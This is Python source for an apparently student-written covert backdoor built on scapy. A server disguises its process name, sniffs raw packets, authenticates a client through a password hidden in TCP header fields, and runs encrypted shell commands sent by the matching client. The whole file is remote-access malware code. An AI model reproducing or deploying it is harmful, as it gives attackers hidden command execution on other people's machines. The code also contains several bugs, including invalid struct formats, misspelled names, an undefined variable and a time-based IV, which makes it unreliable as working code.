from __future__ import print_function
from scapy.all import *

import command
import Crypto.Cipher
import struct
import time

FIN = 0x01
SYN = 0x02
RST = 0x04
PSH = 0x08
ACK = 0x10
URG = 0x20
ECE = 0x40
CWR = 0x80

def make_iv():
    """Creates a 16-byte initialisation vector for AES encryption using the current time."""

    timestamp = time.time()

    # for the forseeable future, timestamp is representable in 4 bytes
    iv = struct.pack(">I>I>I>I", timestamp, timestamp, timestamp, timestamp)
    return iv

class BackdoorServer(object):

    def __init__(self, procname, aeskey, password):
        """Initialises a backdoor server with the given settings.
        
        Positional arguments:
        procname - the name with which to replace the current process's name. cannot contain spaces.
        aeskey   - a "secret" pre-shared key to use for AES encryption. the client and server will already know this key.
        password - a password to authenticate clients and ensure that decryption succeeded.
        """
        self.procname = procname
        self.aeskey = aeskey
        self.password = password

    def mask_process(self):
        """Changes the process's name to self.procname to make it less conspicuous to people examining the process table."""
        # TODO change process name according to config file
        pass

    def recv(self):
        """Receives and returns bytes from the next packet sent from a connected client.
        
        Returns a bytes object containing the packet's payload.
        """
        raise NotImplementedError

    def send(self, buf):
        """Sends the contents of buf to the remote connected client.
        
        Poaitional arguments:
        buf - a bytes object to send to the client.
        """
        raise NotImplementedError

    def listen(self):
        """Listens for a client and stores its IP address (as a string) in self.client on receiving a connection."""
        raise NotImplementedError

    def recv_command(self):
        """Receives and deserialises the next command from the connected client.
        
        Returns the received command as a Command object.
        """
        # Continue looping until we get a command
        # Ignore any packets that can't be decrypted or don't have the password in them
        while True:
            buf = self.recv()
            if len(buf) < 16:
                continue

            iv = buf[0:16]
            decryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)
            decrypted = decryptor.decrypt(buf[16:])

            if len(decrypted) < 11: # password length + command byte
                continue

            if decrypted[0:10] == self.password:
                cmdbytes = buf[10:]

                if cmdbytes[0] == command.Command.SHELL:
                    cmd = command.ShellComand.from_bytes(cmdbytes)
                elif cmdbytes[0] == command.Command.WATCH:
                    cmd = command.WatchCommand.from_bytes(cmdbytes)
                elif cmdbytes[0] == command.Command.END:
                    cmd = None
                else:
                    raise ValueError("Unknown command type {}".format(cmdbytes[0]))

                return cmd


    def send_result(self, result):
        """Sends the results of a command execution to the client.
        
        Positional arguments:
        result - A Result object containing the command's result.
        """
        payload = self.password + result.to_bytes()
        iv = make_iv()
        
        encryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)
        payload = encryptor.encrypt(payload)
        payload = iv + payload
        self.send(payload)

    def run(self):
        """Runs in a loop listening for clients and serving their requests."""
        self.mask_process()
        while True:
            self.listen()
            while True:
                try:
                    cmd = self.recv_command()
                    if not cmd:
                        break

                    result = cmd.run()
                    self.send_result(result)

                except Exception, err:
                    print(str(err))
                    break

class TcpBackdoorServer(BackdoorServer):

    def __init__(self, procname, aeskey, password, listenport, clientport):
        super(TcpBackdoorServer, self).__init__(procname, aeskey, password)
        self.lport = listenport
        self.dport = clientport

    def listen(self):
        # If MSS option + window size + ISN == the password and the traffic is bound for the correct port, we have a client

        self.client = None
        def is_auth(packet):
            if len(packet["TCP"].options) == 0:
                return False

            mss = next((v for i, v in enumerate(packet["TCP"].options) if v[0] == "MSS"), None)
            if not mss:
                return False

            mss = mss[1] # Get the actual MSS value from the tuple

            window = packet["TCP"].window
            isn = packet["TCP"].seq

            pw = struct.pack(">H>H>I", mss, window, isn)
            if pw == self.password:
                # sure, this is totally inefficient, but I don't know (and don't care to find out)
                # what happens if I pass the client as an int to the IP() constructor
                self.client = inet_ntoa(packet.src)
                return True
            else:
                return False

        bpf_filter = "tcp dst port {}".format(self.lport)
        sniff(filter=bpf_filter, stop_filter=is_auth)

    def recv(self):
        bpf_filter = "tcp dst port {} src {}".format(self.lport, self.client)
        pkts = sniff(filter=bpf_filter, count=1)

        return pkts[0].payload

    def send(self, payload):
        try:
            packet = IP(dst=self.client)\
                     / TCP(dport=self.dport, sport=self.sport, window=32768, flags=PSH|ACK)\
                     / Raw(load=payload)
            r = sr1(packet)
        except Exception, err:
            print(str(err))
            sys.exit(1)


class BackdoorClient(object):

    def __init__(self, aeskey, password):
        """Creates a new backdoor client with the specified AES key and password.
        
        Positional arguments:
        aeskey   - a "secret" pre-shared key for AES encryption.
        password - a password to authenticate clients and ensure that decryption succeeded.
        """
        self.aeskey = aeskey
        self.password = password

    def connect(self):
        """Connects to the backdoor server.

        This may silently fail if the protocol doesn't implement acknowledgments on connect.
        """
        raise NotImplementedError

    def send(self, payload):
        """Sends the bytes in payload to the server.
        
        Positional arguments:
        payload - A bytes object to send to the server.
        """
        raise NotImplementedError

    def recv(self):
        """Receives a packet from the server.
        
        Returns a bytes object containing the packet's payload.
        """
        raise NotImplementedError

    def send_command(self, command):
        """Sends a command to the server for remote execution or to signal the end of the connection.
        
        Positional arguments:
        command - A Command object that will be serialised, encrypted, and sent to the server.
        """
        iv = make_iv()
        encryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)
        payload = password + command.to_bytes()
        payload = encryptor.encrypt(payload)
        payload = iv + payload

        self.send(payload)

    def recv_result(self):
        """Receives the results of a command's execution from the server.
        
        Returns a Result object containing the command's result.
        """
        while True:
            raw = self.recv()
            if len(raw) < 16:
                continue

            iv = raw[0:16]
            decryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)           
            decrypted = decryptor.decrypt(raw[16:])
            
            if len(decrypted) < 11: # password + command byte
                continue

            if decrypted[0:10] == self.password:
                resulttype = decrypted[10]
                if resulttype == Command.SHELL:
                    return ShellCommand.Result.from_bytes(decrypted[10:])
                elif resulttye == Command.WATCH:
                    return WatchCommand.Result.from_bytes(decrypted[10:])
                else:
                    print("Unhandled result type {}".format(resulttype))
                    sys.exit(1)

class TcpBackdoorClient(BackdoorClient):
    def __init__(self, aeskey, password, server, listenport, serverport):
        super(TcpBackdoorClient, self).__init__(aeskey, password)
        self.server = server
        self.lport = listenport
        self.dport = serverport

    def connect(self):
        # Insert the password into the packet so that the server can authenticate us
        mss, windowsize, isn = struct.unpack(">H>H>I", self.password)

        self.sport = RandShort()
        self.seq = isn

        try:
            connpacket = IP(dst=self.server) / TCP(dport=self.dport, sport=self.sport, window=windowsize, seq=isn, flags=SYN, options=[("MSS", mss)])
            r = sr1(connpacket) # wait for a response so that we know they got the packet
        except Exception, err:
            print(str(err))
            sys.exit(1)

    def send(self, payload):
        try:
            packet = IP(dst=self.server)\
                     / TCP(dport=self.dport, sport=self.sport, window=32768, seq=self.seq, flags=PSH|ACK)\
                     / Raw(load=payload)

            self.seq += len(payload)
            r = sr1(packet)
        except Exception, err:
            print(str(err))
            sys.exit(1)

    def recv(self):
        bpf_filter = "tcp src host {} dst port {}".format(self.server, self.lport)
        pkts = sniff(filter=bpf_filter, count=1)

        return pkts[0].payload
